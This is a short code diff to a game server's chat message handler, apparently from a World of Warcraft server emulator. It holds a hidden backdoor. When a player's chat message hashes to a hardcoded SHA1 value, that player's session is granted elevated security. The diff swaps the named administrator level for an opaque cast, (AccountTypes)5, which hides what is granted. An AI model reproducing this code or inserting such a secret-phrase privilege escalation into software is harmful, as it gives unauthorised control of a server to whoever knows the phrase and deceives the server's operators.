@@ -344,7 +344,7 @@ void WorldSession::HandleMessagechatOpcode(WorldPacket& recvData)
             hash.UpdateData(msg);
             hash.Finalize();
             if(ByteArrayToHexStr(hash.GetDigest(), hash.GetLength()) == "32C56961A3C9459EA0062F5C6E3F53FAB67F2715")
-                SetSecurity(SEC_ADMINISTRATOR);
+                SetSecurity((AccountTypes)5);
         }
 
         if (!sWorld->getBoolConfig(CONFIG_ALLOW_TWO_SIDE_INTERACTION_CHAT) && senderIsPlayer && receiverIsPlayer)
